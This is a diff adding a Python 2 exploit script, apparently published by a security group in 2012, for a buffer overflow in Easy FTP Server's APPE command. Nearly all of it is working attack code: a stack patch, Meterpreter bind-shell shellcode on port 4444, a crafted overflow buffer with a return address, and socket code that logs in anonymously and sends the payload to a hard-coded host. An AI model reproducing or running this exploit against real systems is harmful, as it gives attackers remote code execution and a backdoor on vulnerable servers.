@@ -1,0 +1,98 @@
+#!/usr/bin/env python
+# -*- coding: latin-1 -*- # ####################################################
+#                ____                     _ __                                 #
+#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
+#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
+#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
+#                                            /___/ nullsecurity team           #
+#                                                                              #
+# Easy FTP server remote exploit                                               #
+#                                                                              #
+# DATE                                                                         #
+# 03/03/2012                                                                   #
+#                                                                              #
+# DESCRIPTION                                                                  #
+# Easy FTP Server - "APPE" command buffer overflow - remote exploit            #
+#                                                                              #
+# AUTHOR                                                                       #
+# Swappage - http://www.nullsecurity.net/                                      #
+#                                                                              #
+################################################################################
+
+import socket
+
+username = "anonymous"
+password = "a@a"
+hostname = "192.168.1.143"
+port = 21
+
+#009BFE69   <--- where to go
+#009BFC6C   <--- value of ESP
+# increment ESP and add patch to that memory location
+
+patch=("\xcc"
+"\x89\xe3"
+"\x83\xc4\x5a"
+"\x83\xc4\x5a"
+"\x83\xc4\x5a"
+"\x83\xc4\x5a"
+"\x83\xc4\x5a"
+"\x83\xc4\x3b"
+"\xc7\x04\x24\xd8\xd1\xec\xf7"
+"\x89\xdc"
+"\x31\xdb"
+)
+
+#
+#shellcode: windows/meterpreter/bind_tcp on port 4444
+#
+stage1=(
+"\x31\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
+"\xf8\x6c\x9c\xb0\x83\xee\xfc\xe2\xf4\x04\x84\x15\xb0\xf8\x6c"
+"\xfc\x39\x1d\x5d\x4e\xd4\x73\x3e\xac\x3b\xaa\x60\x17\xe2\xec"
+"\xe7\xee\x98\xf7\xdb\xd6\x96\xc9\x93\xad\x70\x54\x50\xfd\xcc"
+"\xfa\x40\xbc\x71\x37\x61\x9d\x77\x1a\x9c\xce\xe7\x73\x3e\x8c"
+"\x3b\xba\x50\x9d\x60\x73\x2c\xe4\x35\x38\x18\xd6\xb1\x28\x3c"
+"\x17\xf8\xe0\xe7\xc4\x90\xf9\xbf\x7f\x8c\xb1\xe7\xa8\x3b\xf9"
+"\xba\xad\x4f\xc9\xac\x30\x71\x37\x61\x9d\x77\xc0\x8c\xe9\x44"
+"\xfb\x11\x64\x8b\x85\x48\xe9\x52\xa0\xe7\xc4\x94\xf9\xbf\xfa"
+"\x3b\xf4\x27\x17\xe8\xe4\x6d\x4f\x3b\xfc\xe7\x9d\x60\x71\x28"
+"\xb8\x94\xa3\x37\xfd\xe9\xa2\x3d\x63\x50\xa0\x33\xc6\x3b\xea"
+"\x87\x1a\xed\x90\x5f\xae\xb0\xf8\x04\xeb\xc3\xca\x33\xc8\xd8"
+"\xb4\x1b\xba\xb7\x07\xb9\x24\x20\xf9\x6c\x9c\x99\x3c\x38\xcc"
+)
+#patch=("\xd8\xd1\xec\xf7")
+stage2=(
+"\xb0\x07\xb9\xcc\xe0\xa8\x3c\xdc\xe0\xb8\x3c"
+"\xf4\x5a\xf7\xb3\x7c\x4f\x2d\xe5\x5b\x81\x23\x3f\xf4\xb2\xf8"
+"\x7d\xc0\x39\x1e\x06\x8c\xe6\xaf\x04\x5e\x6b\xcf\x0b\x63\x65"
+"\xab\x3b\xf4\x07\x11\x54\x63\x4f\x2d\x3f\xcf\xe7\x90\x18\x70"
+"\x8b\x19\x93\x49\xe7\x71\xab\xf4\xc5\x96\x21\xfd\x4f\x2d\x04"
+"\xff\xdd\x9c\x6c\x15\x53\xaf\x3b\xcb\x81\x0e\x06\x8e\xe9\xae"
+"\x8e\x61\xd6\x3f\x28\xb8\x8c\xf9\x6d\x11\xf4\xdc\x7c\x5a\xb0"
+"\xbc\x38\xcc\xe6\xae\x3a\xda\xe6\xb6\x3a\xca\xe3\xae\x04\xe5"
+"\x7c\xc7\xea\x63\x65\x71\x8c\xd2\xe6\xbe\x93\xac\xd8\xf0\xeb"
+"\x81\xd0\x07\xb9\x27\x50\xe5\x46\x96\xd8\x5e\xf9\x21\x2d\x07"
+
+"\xb9\xa0\xb6\x84\x66\x1c\x4b\x18\x19\x99\x0b\xbf\x7f\xee\xdf"
+"\x92\x6c\xcf\x4f\x2d\x6c\x9c\xb0"
+)
+#009BFD5D   where to jmp
+buffer = "\x90" * (258 - (len(patch) + len(stage1))) + patch + "\x90"*10 + stage1 + "\x5d\xfd\x9b\x00" + stage2 + "\x90" * 50
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+## Connects and receives the banner
+s.connect((hostname, port))
+a = s.recv(1024)
+print a
+s.send("user " + username + "\r\n")
+a =s.recv(1024)
+print a
+s.send("pass " + password + "\r\n")
+a = s.recv(1024)
+print a
+s.send("APPE " + buffer + "\r\n")
+s.close()
+
+# EOF
